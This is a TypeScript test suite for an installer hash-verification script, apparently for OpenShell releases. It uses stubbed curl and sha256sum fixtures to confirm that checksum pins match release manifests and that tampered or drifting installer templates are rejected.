${capabilityMarker}`,
  );
  expect(withIdentityCheck, "v0.0.106 executable identity helper").not.toBe(source);
  expect(result, "v0.0.106 capability proof").not.toBe(withIdentityCheck);
  return result;
}

function removeV00106OperationalTrust(source: string): string {
  const identityStart = source.indexOf("is_pinned_openshell_v00106_linux_x86_64_install() {");
  const sandboxStart = source.indexOf("pinned_sandbox_build_version() {", identityStart);
  expect([identityStart, sandboxStart], "v0.0.106 helper boundaries").not.toContain(-1);
  const withoutIdentity = `${source.slice(0, identityStart)}${source.slice(sandboxStart)}`;
  const capabilityStart = withoutIdentity.indexOf(
    "  # The v0.0.106 release binaries are stripped and no longer retain every",
  );
  const fallbackStart = withoutIdentity.indexOf(
    "  # OpenShell #1865 has no authoritative CLI/RPC capability query yet.",
    capabilityStart,
  );
  expect([capabilityStart, fallbackStart], "v0.0.106 proof boundaries").not.toContain(-1);
  return `${withoutIdentity.slice(0, capabilityStart)}${withoutIdentity.slice(fallbackStart)}`;
}

function renderInstallerTemplate(openshellVersion: string, pinFunction: string): string {
  const selected = INSTALLER_TEMPLATE.replace(
    /^MIN_VERSION="[0-9]+\.[0-9]+\.[0-9]+"$/m,
    `MIN_VERSION="${openshellVersion}"`,
  )
    .replace(/^MAX_VERSION="[0-9]+\.[0-9]+\.[0-9]+"$/m, `MAX_VERSION="${openshellVersion}"`)
    .replace(
      /^DEV_MIN_VERSION="[0-9]+\.[0-9]+\.[0-9]+"$/m,
      `DEV_MIN_VERSION="${openshellVersion}"`,
    );
  const withPinFunction = replacePinFunction(
    selected,
    "openshell_pinned_sha256",
    "openshell_checksum_line() {",
    pinFunction,
  );
  const operationalTemplate =
    openshellVersion === "0.0.106"
      ? withPinFunction.includes("is_pinned_openshell_v00106_linux_x86_64_install() {")
        ? withPinFunction
        : addV00106OperationalTrust(withPinFunction)
      : removeV00106OperationalTrust(withPinFunction);
  const sandboxFunctionStart = operationalTemplate.indexOf("pinned_sandbox_build_version() {");
  const sandboxFunctionEnd = operationalTemplate.indexOf(
    "\ncomponent_build_version() {",
    sandboxFunctionStart,
  );
  expect(sandboxFunctionStart, "sandbox build map template start").not.toBe(-1);
  expect(sandboxFunctionEnd, "sandbox build map template end").not.toBe(-1);
  const sandboxFunction = operationalTemplate.slice(sandboxFunctionStart, sandboxFunctionEnd);
  const hasSandboxBuild = sandboxFunction.includes(`printf '%s\\n' "${openshellVersion}"`);
  const selectedDigests =
    openshellVersion === "0.0.101"
      ? V00101_SANDBOX_BUILD_DIGESTS
      : openshellVersion === "0.0.103"
        ? V00103_SANDBOX_BUILD_DIGESTS
        : openshellVersion === "0.0.106"
          ? V00106_SANDBOX_BUILD_DIGESTS
          : openshellVersion === "9.9.9"
            ? SYNTHETIC_SANDBOX_BUILD_DIGESTS
            : undefined;
  expect(hasSandboxBuild || selectedDigests, `sandbox fixture ${openshellVersion}`).toBeTruthy();
  return hasSandboxBuild
    ? operationalTemplate
    : addSandboxBuildPins(operationalTemplate, openshellVersion, selectedDigests!);
}

function renderBrevTemplate(openshellVersion: string, pinFunction: string): string {
  const selected = BREV_TEMPLATE.replace(
    /^(\s*stable\s*\|\s*auto\)\s*OPENSHELL_VERSION=")v[0-9]+\.[0-9]+\.[0-9]+("\s*;;\s*)$/m,
    `$1v${openshellVersion}$2`,
  );
  return replacePinFunction(
    selected,
    "openshell_cli_pinned_sha256",
    "openshell_checksum_line() {",
    pinFunction,
  );
}

function renderSupervisorRuntime(openshellVersion: string): string {
  const hasManifestIdentity = SUPERVISOR_RUNTIME_TEMPLATE.includes(
    `  "${openshellVersion}": "sha256:`,
  );
  const manifestDigest =
    openshellVersion === "0.0.103"
      ? V00103_SUPERVISOR_MANIFEST_DIGEST
      : openshellVersion === "0.0.106"
        ? V00106_SUPERVISOR_MANIFEST_DIGEST
        : openshellVersion === "9.9.9"
          ? SYNTHETIC_SUPERVISOR_MANIFEST_DIGEST
          : undefined;
  expect(
    hasManifestIdentity || manifestDigest,
    `supervisor fixture ${openshellVersion}`,
  ).toBeTruthy();
  return hasManifestIdentity
    ? SUPERVISOR_RUNTIME_TEMPLATE
    : SUPERVISOR_RUNTIME_TEMPLATE.replace(
        "const OPENSHELL_SUPERVISOR_MANIFEST_DIGESTS: Readonly<Record<string, string>> = {\n",
        `const OPENSHELL_SUPERVISOR_MANIFEST_DIGESTS: Readonly<Record<string, string>> = {
  "${openshellVersion}": "${manifestDigest}",
`,
      );
}

function createFixture(
  openshellVersion = "0.0.72",
  formatting: PinFormatting = "canonical",
): string {
  const checksumManifests =
    CHECKSUM_MANIFESTS_BY_VERSION.get(openshellVersion) ?? CHECKSUM_MANIFESTS;
  const assetDigests = ASSET_DIGESTS_BY_VERSION.get(openshellVersion) ?? ASSET_DIGESTS;
  const fixtureRoot = fs.mkdtempSync(path.join(os.tmpdir(), "nemoclaw-installer-hash-"));
  const scriptsDir = path.join(fixtureRoot, "scripts");
  const checksDir = path.join(scriptsDir, "checks");
  const binDir = path.join(fixtureRoot, "bin");
  tempDirs.push(fixtureRoot);
  fs.mkdirSync(checksDir, { recursive: true });
  fs.mkdirSync(binDir, { recursive: true });
  fs.mkdirSync(path.join(fixtureRoot, "nemoclaw-blueprint"), {
    recursive: true,
  });
  fs.mkdirSync(path.join(fixtureRoot, "src/lib/onboard"), { recursive: true });
  const checker = fs.readFileSync(
    path.join(REPO_ROOT, "scripts", "check-installer-hash.sh"),
    "utf8",
  );
  fs.writeFileSync(path.join(scriptsDir, "check-installer-hash.sh"), checker);
  fs.copyFileSync(
    path.join(REPO_ROOT, "scripts", "checks", "extract-installer-pins.mts"),
    path.join(checksDir, "extract-installer-pins.mts"),
  );

  fs.writeFileSync(
    path.join(fixtureRoot, "nemoclaw-blueprint", "blueprint.yaml"),
    `max_openshell_version: "${openshellVersion}"\n`,
  );
  fs.writeFileSync(
    path.join(fixtureRoot, "src/lib/onboard/docker-driver-gateway-runtime.ts"),
    renderSupervisorRuntime(openshellVersion),
  );
  fs.writeFileSync(
    path.join(scriptsDir, "install-openshell.sh"),
    renderInstallerTemplate(
      openshellVersion,
      renderPinFunction(
        "openshell_pinned_sha256",
        INSTALLER_ASSETS,
        openshellVersion,
        formatting,
        assetDigests,
      ),
    ),
  );
  fs.writeFileSync(
    path.join(scriptsDir, "brev-launchable-ci-cpu.sh"),
    renderBrevTemplate(
      openshellVersion,
      renderPinFunction(
        "openshell_cli_pinned_sha256",
        ASSETS.slice(0, 2),
        openshellVersion,
        formatting,
        assetDigests,
      ),
    ),
  );
  fs.writeFileSync(
    path.join(binDir, "curl"),
    `#!/usr/bin/env bash
set -euo pipefail
output=
url=
while [ "$#" -gt 0 ]; do
  case "$1" in
    -o) output="$2"; shift 2 ;;
    http*) url="$1"; shift ;;
    *) shift ;;
  esac
done
case "$url" in
  *releases/download/v0.0.106/*)
    case "\${url##*/}" in
      openshell-checksums-sha256.txt)
        printf '%s' '${V00106_CHECKSUM_MANIFESTS.get("openshell-checksums-sha256.txt")}' >"$output"
        ;;
      openshell-gateway-checksums-sha256.txt)
        printf '%s' '${V00106_CHECKSUM_MANIFESTS.get("openshell-gateway-checksums-sha256.txt")}' >"$output"
        ;;
      openshell-sandbox-checksums-sha256.txt)
        printf '%s' '${V00106_CHECKSUM_MANIFESTS.get("openshell-sandbox-checksums-sha256.txt")}' >"$output"
        ;;
      openshell.rb)
        printf '%s\n' '# OpenShell v0.0.106 formula fixture' >"$output"
        ;;
    esac
    ;;
  *releases/download/v${openshellVersion}/*)
    case "\${NEMOCLAW_TEST_CURL_MODE}" in
      failure) exit 22 ;;
    esac
    case "\${url##*/}" in
      openshell-checksums-sha256.txt)
        case "\${NEMOCLAW_TEST_CURL_MODE}" in
          partial) printf '%s\\n' '${checksumManifests.get("openshell-checksums-sha256.txt")?.split("\n")[0]}' >"$output" ;;
          *) printf '%s' '${checksumManifests.get("openshell-checksums-sha256.txt")}' >"$output" ;;
        esac
        ;;
      openshell-gateway-checksums-sha256.txt)
        case "\${NEMOCLAW_TEST_CURL_MODE}" in
          partial-manifest-missing)
            printf '%s\n' 'curl: (22) The requested URL returned error: 404' >&2
            exit 22
            ;;
          *) printf '%s' '${checksumManifests.get("openshell-gateway-checksums-sha256.txt")}' >"$output" ;;
        esac
        ;;
      openshell-sandbox-checksums-sha256.txt)
        printf '%s' '${checksumManifests.get("openshell-sandbox-checksums-sha256.txt")}' >"$output"
        ;;
      openshell.rb)
        printf '%s\n' 'class Openshell < Formula; end' >"$output"
        ;;
    esac
    ;;
esac
`,
  );
  fs.chmodSync(path.join(binDir, "curl"), 0o755);
  fs.writeFileSync(
    path.join(binDir, "sha256sum"),
    `#!/usr/bin/env bash
set -euo pipefail
case "\${1:-}" in
  */openshell.rb)
    case "\${NEMOCLAW_TEST_CURL_MODE:-}" in
      formula-mismatch | formula-self-authorized) digest='${"0".repeat(64)}' ;;
      *)
        if grep -q 'OpenShell v0.0.106' "$1"; then
          digest='${V00106_ASSET_DIGESTS.get(FORMULA_ASSET)}'
        else
          digest='${assetDigests.get(FORMULA_ASSET)}'
        fi
        ;;
    esac
    printf '%s  %s\\n' "$digest" "$1"
    ;;
  *)
    case "$(uname -s)" in
      Darwin) /usr/bin/shasum -a 256 "$@" ;;
      *) /usr/bin/sha256sum "$@" ;;
    esac
    ;;
esac
`,
  );
  fs.chmodSync(path.join(binDir, "sha256sum"), 0o755);
  return fixtureRoot;
}

function runFixture(
  mode: FixtureMode,
  openshellVersion?: string,
  trustedChecker = false,
  formatting: PinFormatting = "canonical",
) {
  const fixtureRoot = createFixture(openshellVersion, formatting);
  const targetChecker = path.join(fixtureRoot, "scripts", "check-installer-hash.sh");
  const trustedRoot = fs.mkdtempSync(path.join(os.tmpdir(), "nemoclaw-trusted-hash-check-"));
  const trustedCheckerPath = path.join(trustedRoot, "scripts", "check-installer-hash.sh");
  const trustedParserPath = path.join(
    trustedRoot,
    "scripts",
    "checks",
    "extract-installer-pins.mts",
  );
  tempDirs.push(trustedRoot);
  fs.mkdirSync(path.dirname(trustedParserPath), { recursive: true });
  fs.copyFileSync(path.join(REPO_ROOT, "scripts", "check-installer-hash.sh"), trustedCheckerPath);
  fs.copyFileSync(
    path.join(REPO_ROOT, "scripts", "checks", "extract-installer-pins.mts"),
    trustedParserPath,
  );
  const parserSource = fs.readFileSync(trustedParserPath, "utf8");
  const mutateParser = PARSER_MUTATIONS[mode];
  const parserResult = mutateParser?.(parserSource) ?? parserSource;
  expect(parserResult === parserSource, `parser mutation ${mode}`).toBe(mutateParser === undefined);
  fs.writeFileSync(trustedParserPath, parserResult);
  fs.writeFileSync(
    targetChecker,
    trustedChecker
      ? "#!/usr/bin/env bash\necho PR_CHECKER_EXECUTED\nexit 0\n"
      : fs.readFileSync(targetChecker, "utf8"),
  );
  const checker = trustedChecker ? trustedCheckerPath : targetChecker;
  const installer = path.join(fixtureRoot, "scripts", "install-openshell.sh");
  const blueprint = path.join(fixtureRoot, "nemoclaw-blueprint", "blueprint.yaml");
  const installerSource = fs.readFileSync(installer, "utf8");
  const mutateInstaller = INSTALLER_MUTATIONS[mode] ?? ((source: string) => source);
  fs.writeFileSync(installer, mutateInstaller(installerSource));
  const brevInstaller = path.join(fixtureRoot, "scripts", "brev-launchable-ci-cpu.sh");
  const brevSource = fs.readFileSync(brevInstaller, "utf8");
  const mutateBrev = BREV_MUTATIONS[mode] ?? ((source: string) => source);
  fs.writeFileSync(brevInstaller, mutateBrev(brevSource));
  const targetParser = path.join(fixtureRoot, "scripts", "checks", "extract-installer-pins.mts");
  fs.writeFileSync(
    targetParser,
    mode === "pr-parser-bypass"
      ? 'process.stdout.write("PR_PARSER_EXECUTED\\n");\n'
      : fs.readFileSync(targetParser, "utf8"),
  );
  INPUT_MUTATIONS[mode]?.({ blueprint, brevInstaller, fixtureRoot, installer });
  return spawnSync("bash", [checker], {
    cwd: fixtureRoot,
    encoding: "utf8",
    env: {
      ...process.env,
      GITHUB_TOKEN: "",
      GH_TOKEN: "",
      NEMOCLAW_INSTALLER_HASH_REPO_ROOT: trustedChecker ? fixtureRoot : "",
      NEMOCLAW_TEST_CURL_MODE:
        mode.includes("bypass") || mode === "brev-mismatch" ? "complete" : mode,
      PATH: `${path.join(fixtureRoot, "bin")}:${process.env.PATH ?? ""}`,
    },
  });
}

function expectTrustedRelease(
  result: ReturnType<typeof runFixture>,
  version: string,
  manifests: ReadonlyMap<string, string>,
  assets: ReadonlyMap<string, string>,
): void {
  expect(result.status, result.stdout).toBe(0);
  expect(result.stdout).toContain(`Checking OpenShell v${version} release assets`);
  manifests.forEach((contents, manifest) => {
    const digest = createHash("sha256").update(contents).digest("hex");
    expect(result.stdout).toContain(`OK: ${manifest} (${digest})`);
  });
  expect(result.stdout).toContain(`OK: installer openshell.rb (${assets.get(FORMULA_ASSET)})`);
  expect(result.stdout).toContain("All installer hashes are current");
}

describe("installer hash verification", () => {
  it("verifies all installer and Brev pins from token-free checksum manifests", () => {
    const result = runFixture("complete");

    expect(result.status).toBe(0);
    expect(result.stdout).toContain("All installer hashes are current");
  });

  it("verifies each complete installer release table independently", () => {
    const result = runFixture("complete-multiple-installer-versions", undefined, true);

    expect(result.status).toBe(0);
    expect(result.stdout).toContain("Checking OpenShell v0.0.72 release assets");
    expect(result.stdout).toContain("Checking OpenShell v0.0.106 release assets");
    expect(result.stdout).toContain("All installer hashes are current");
  });

  it("accepts the reviewed product and qualification release cohorts", () => {
    const result = runFixture("reviewed-release-cohorts", "0.0.101", true);

    expect(result.status, result.stdout).toBe(0);
    expect(result.stdout).toContain("Checking OpenShell v0.0.101 release assets");
    expect(result.stdout).toContain("Checking OpenShell v0.0.106 release assets");
    expect(result.stdout).toContain("All installer hashes are current");
  });

  it("rejects download drift from the reviewed release cohorts", () => {
    const result = runFixture("reviewed-release-cohorts-url-drift", "0.0.101", true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("installer operational template is not base-trusted");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("fails closed when a secondary installer release pin differs from its manifest", () => {
    const result = runFixture("secondary-installer-version-mismatch", undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain(
      `installer ${ASSETS[0]} does not match exactly one v0.0.106 checksum entry`,
    );
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("verifies the pinned Homebrew formula", () => {
    const result = runFixture("complete", undefined, true);

    expect(result.status).toBe(0);
    expect(result.stdout).toContain(`OK: installer ${FORMULA_ASSET} (${FORMULA_DIGEST})`);
    expect(result.stdout).toContain("All installer hashes are current");
  });

  it.each([
    "installer-homebrew-trust-transition-drift",
    "installer-homebrew-trust-transition-stable-leak",
    "installer-homebrew-trust-transition-complete-current",
    "installer-homebrew-untrust-cleanup-drift",
  ] as const)("rejects Homebrew trust-transition drift in %s", (mode) => {
    const result = runFixture(mode, undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("installer operational template is not base-trusted");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it.each([
    ["formula-mismatch", "does not match the base-trusted"],
    ["formula-pin-mismatch", "pin does not match the base-trusted"],
  ] as const)("fails closed for %s", (mode, diagnostic) => {
    const result = runFixture(mode, undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain(
      `STALE: installer openshell.rb ${diagnostic} v0.0.72 formula digest`,
    );
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("prevents a pin change from self-authorizing a replaced formula asset", () => {
    const result = runFixture("formula-self-authorized", undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain(
      "STALE: installer openshell.rb does not match the base-trusted v0.0.72 formula digest",
    );
    expect(result.stdout).toContain(`trusted:  ${FORMULA_DIGEST}`);
    expect(result.stdout).toContain(`upstream: ${"0".repeat(64)}`);
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("derives the release version from matching static installer pin tables", () => {
    const result = runFixture("complete", undefined, true);

    expect(result.status).toBe(0);
    expect(result.stdout).toContain("Checking OpenShell v0.0.72 release assets");
    expect(result.stdout).toContain("All installer hashes are current");
  });

  it.each([
    ["0.0.99", V0099_CHECKSUM_MANIFESTS, V0099_ASSET_DIGESTS],
    ["0.0.101", V00101_CHECKSUM_MANIFESTS, V00101_ASSET_DIGESTS],
    ["0.0.103", V00103_CHECKSUM_MANIFESTS, V00103_ASSET_DIGESTS],
    ["0.0.106", V00106_CHECKSUM_MANIFESTS, V00106_ASSET_DIGESTS],
  ] as const)(
    "accepts the complete trusted OpenShell %s release identity",
    (version, manifests, assets) => {
      expectTrustedRelease(runFixture("complete", version, true), version, manifests, assets);
    },
  );

  it("selects a second complete trusted release from the allowlist", () => {
    const result = runFixture("allowlisted-alternate-version", "9.9.9", true);

    expect(result.status).toBe(0);
    expect(result.stdout).toContain("Checking OpenShell v9.9.9 release assets");
    expect(result.stdout).toContain("All installer hashes are current");
  });

  it("fails closed when the derived release has no base-trusted release record", () => {
    const result = runFixture("complete", "9.9.9", true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("OpenShell v9.9.9 is not in the base-trusted release records");
    expect(result.stdout).not.toContain("Checking OpenShell v9.9.9 release assets");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("requires the trusted release-record prerequisite before a newer pin PR", () => {
    // The first invocation keeps the base trust records unchanged while the
    // separate target tree selects 9.9.9. The target cannot authorize itself.
    // The second models the complete trust prerequisite already present in
    // base code; only then may the otherwise identical pin tree pass.
    const beforePrerequisite = runFixture("complete", "9.9.9", true);
    expect(beforePrerequisite.status).toBe(1);
    expect(beforePrerequisite.stdout).toContain(
      "OpenShell v9.9.9 is not in the base-trusted release records",
    );
    expect(beforePrerequisite.stdout).not.toContain("PR_CHECKER_EXECUTED");

    const afterPrerequisite = runFixture("allowlisted-alternate-version", "9.9.9", true);
    expect(afterPrerequisite.status).toBe(0);
    expect(afterPrerequisite.stdout).toContain("Checking OpenShell v9.9.9 release assets");
    expect(afterPrerequisite.stdout).toContain("All installer hashes are current");
    expect(afterPrerequisite.stdout).not.toContain("PR_CHECKER_EXECUTED");
  });

  it("fails closed when a trusted release record lacks all three manifest digests", () => {
    const result = runFixture("incomplete-trusted-allowlist", undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain(
      "OpenShell v0.0.72 must have exactly three trusted release-manifest digests",
    );
    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("fails closed when a trusted release record lacks its formula identity", () => {
    const result = runFixture("missing-trusted-formula", undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("trusted OpenShell v0.0.72 formula record is invalid");
    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("fails closed when trusted release records contain a duplicate version", () => {
    const result = runFixture("duplicate-trusted-release", undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain(
      "trusted OpenShell release records contain duplicate versions: 0.0.72",
    );
    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it.each(["malformed-trusted-formula", "mismatched-trusted-formula-url"] as const)(
    "fails closed when a trusted formula record is invalid: %s",
    (mode) => {
      const result = runFixture(mode, undefined, true);

      expect(result.status).toBe(1);
      expect(result.stdout).toContain("trusted OpenShell v0.0.72 formula record is invalid");
      expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
      expect(result.stdout).not.toContain("All installer hashes are current");
    },
  );

  it("fails closed when the live formula differs from its trusted release digest", () => {
    const result = runFixture("trusted-formula-mismatch", undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain(
      "STALE: installer openshell.rb does not match the base-trusted v0.0.72 formula digest",
    );
    expect(result.stdout).toContain(`trusted:  ${"0".repeat(64)}`);
    expect(result.stdout).toContain(`upstream: ${FORMULA_DIGEST}`);
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("rejects newer runtime consumers when both trusted pin tables stay on an older release", () => {
    const result = runFixture("runtime-consumers-newer-than-tables", undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
    expect(result.stdout).toContain(
      "installer pin-table release 0.0.72 must match blueprint max_openshell_version 0.0.85",
    );
    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it.each([
    [
      "installer-min-version-drift",
      "installer pin-table release 0.0.72 must match installer MIN_VERSION 0.0.85",
    ],
    [
      "installer-max-version-drift",
      "installer pin-table release 0.0.72 must match installer MAX_VERSION 0.0.85",
    ],
    [
      "installer-dev-min-version-drift",
      "installer pin-table release 0.0.72 must match installer DEV_MIN_VERSION 0.0.85",
    ],
    [
      "brev-stable-version-drift",
      "installer pin-table release 0.0.72 must match Brev stable OpenShell default 0.0.85",
    ],
    ["installer-pin-selector-drift", "installer operational template is not base-trusted"],
  ] as const)("rejects %s", (mode, diagnostic) => {
    const result = runFixture(mode, undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
    expect(result.stdout).toContain(diagnostic);
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it.each([
    ["installer-decoy-table", "installer operational template is not base-trusted"],
    ["installer-comment-decoy", "installer operational template is not base-trusted"],
    ["installer-dead-code-decoy", "installer operational template is not base-trusted"],
    [
      "installer-later-min-selector-override",
      "installer selector 1 must contain exactly one permitted release selector literal",
    ],
    ["installer-later-selector-override", "installer operational template is not base-trusted"],
    ["installer-indirect-selector-override", "installer operational template is not base-trusted"],
    ["installer-sha-command-bypass", "installer operational template is not base-trusted"],
    ["installer-extra-download", "installer operational template is not base-trusted"],
    ["installer-changed-asset", "installer operational template is not base-trusted"],
    ["installer-changed-checksum", "installer operational template is not base-trusted"],
    ["installer-changed-url", "installer operational template is not base-trusted"],
    ["installer-bypassed-comparison", "installer operational template is not base-trusted"],
    ["installer-changed-extraction-target", "installer operational template is not base-trusted"],
    ["brev-decoy-table", "Brev launchable operational template is not base-trusted"],
    ["brev-comment-decoy", "Brev launchable operational template is not base-trusted"],
    ["brev-dead-code-decoy", "Brev launchable operational template is not base-trusted"],
    ["brev-bypassed-verifier-call", "Brev launchable operational template is not base-trusted"],
    ["brev-later-selector-override", "Brev launchable operational template is not base-trusted"],
    ["brev-indirect-selector-override", "Brev launchable operational template is not base-trusted"],
    ["brev-sha-command-bypass", "Brev launchable operational template is not base-trusted"],
    ["brev-extra-download", "Brev launchable operational template is not base-trusted"],
    ["brev-changed-asset", "Brev launchable operational template is not base-trusted"],
    ["brev-changed-url", "Brev launchable operational template is not base-trusted"],
    ["brev-bypassed-comparison", "Brev launchable operational template is not base-trusted"],
    ["brev-changed-extraction-target", "Brev launchable operational template is not base-trusted"],
  ] as const)("rejects operational-consumption drift in %s", (mode, diagnostic) => {
    const result = runFixture(mode, undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
    expect(result.stdout).toContain(diagnostic);
    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it.each([
    [
      "installer-literalized-pin-input",
      "openshell_pinned_sha256 must start with local release_tag and asset inputs",
    ],
    [
      "brev-literalized-pin-selector",
      "openshell_cli_pinned_sha256 must select on release_tag and asset",
    ],
    [
      "multiple-installer-versions",
      `installer pin table for 0.0.72 must contain the exact consumed asset set; missing=[${ASSETS[0]}]`,
    ],
    ["mismatched-table-versions", "installer pin table has no assets for selected release 0.0.73"],
  ] as const)("fails closed for %s", (mode, diagnostic) => {
    const result = runFixture(mode, undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
    expect(result.stdout).toContain(diagnostic);
    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it.each([
    [
      "official-but-unexpected-installer-asset",
      "installer pin table must contain the exact consumed asset set",
      OFFICIAL_UNEXPECTED_INSTALLER_ASSET,
    ],
    [
      "official-but-unexpected-brev-asset",
      "Brev pin table must contain the exact consumed asset set",
      OFFICIAL_UNEXPECTED_BREV_ASSET,
    ],
  ] as const)("rejects %s despite a valid published digest", (mode, diagnostic, unexpected) => {
    const result = runFixture(mode, undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
    expect(result.stdout).toContain(diagnostic);
    expect(result.stdout).toContain(`unexpected=[${unexpected}]`);
    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it.each([
    "equals-whitespace",
    "comments",
    "line-continuations",
    "quote-styles",
    "mixed-whitespace",
  ] as const)("extracts pins across %s formatting", (formatting) => {
    const result = runFixture("complete", undefined, false, formatting);

    expect(result.status).toBe(0);
    expect(result.stdout).toContain("All installer hashes are current");
  });

  it("lets trusted checker code inspect a separate pull-request tree", () => {
    const result = runFixture("complete", undefined, true);

    expect(result.status).toBe(0);
    expect(result.stdout).not.toContain("PR_CHECKER_EXECUTED");
    expect(result.stdout).toContain("All installer hashes are current");
  });

  it.each(["missing-brev-pin", "duplicate-brev-pin"] as const)(
    "fails closed when the pull-request tree has a %s",
    (mode) => {
      const result = runFixture(mode, undefined, true);

      expect(result.status).toBe(1);
      expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
      expect(result.stdout).not.toContain("All installer hashes are current");
    },
  );

  it("fails closed when the installer pin table contains a duplicate asset", () => {
    const result = runFixture("duplicate-installer-pin", undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
    expect(result.stdout).toContain(
      `openshell_pinned_sha256 contains duplicate assets: ${ASSETS[0]}`,
    );
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("does not let a pull request replace the trusted verifier with a success stub", () => {
    const result = runFixture("pr-checker-bypass", undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain(
      "STALE: Brev launchable openshell-x86_64-unknown-linux-musl.tar.gz",
    );
    expect(result.stdout).not.toContain("PR_CHECKER_EXECUTED");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("does not let a pull request replace the trusted parser with a success stub", () => {
    const result = runFixture("pr-parser-bypass", undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain(
      "STALE: Brev launchable openshell-x86_64-unknown-linux-musl.tar.gz",
    );
    expect(result.stdout).not.toContain("PR_PARSER_EXECUTED");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it.each([
    ["symlink-installer-input", "installer input must be a regular file and not a symbolic link"],
    [
      "non-regular-brev-input",
      "Brev launchable input must be a regular file and not a symbolic link",
    ],
    ["oversized-installer-input", "installer input exceeds the 1048576-byte limit"],
    [
      "symlink-scripts-parent",
      "installer input parent must be a real directory and not a symbolic link",
    ],
  ] as const)("fails closed for %s", (mode, diagnostic) => {
    const result = runFixture(mode, undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
    expect(result.stdout).toContain(diagnostic);
    expect(result.stdout).not.toContain("All installer hashes are current");
    expect(result.stdout).not.toContain(SYMLINK_INPUT_MARKER);
    expect(result.stderr).not.toContain(SYMLINK_INPUT_MARKER);
  });

  it("fails closed when the OpenShell checksum release assets are unreachable", () => {
    const result = runFixture("failure");

    expect(result.status).not.toBe(0);
    expect(result.stdout).toContain("Checking OpenShell v0.0.72 release assets");
    expect(result.stdout).toContain("15 OpenShell release-asset check(s) failed");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("fails closed when an OpenShell checksum manifest is incomplete", () => {
    const result = runFixture("partial");

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("digest does not match the pinned v0.0.72 release asset");
    expect(result.stdout).toContain("expected all 11 pinned asset references");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("fails closed when one OpenShell checksum manifest returns HTTP 404", () => {
    const result = runFixture("partial-manifest-missing");

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("OK: openshell-checksums-sha256.txt");
    expect(result.stdout).toContain(
      "STALE: unable to download openshell-gateway-checksums-sha256.txt",
    );
    expect(result.stdout).toContain("OK: openshell-sandbox-checksums-sha256.txt");
    expect(result.stderr).toContain("requested URL returned error: 404");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("fails closed when a pinned installer asset is outside the exact consumed set", () => {
    const result = runFixture("partial-asset-missing");

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
    expect(result.stdout).toContain(
      "installer pin table must contain the exact consumed asset set",
    );
    expect(result.stdout).toContain(`unexpected=[${UNPUBLISHED_ASSET}]`);
    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("fails closed when the Brev launchable pin drifts from the release manifest", () => {
    const result = runFixture("brev-mismatch");

    expect(result.status).toBe(1);
    expect(result.stdout).toContain(
      "STALE: Brev launchable openshell-x86_64-unknown-linux-musl.tar.gz",
    );
    expect(result.stdout).not.toContain("All installer hashes are current");
  });
});
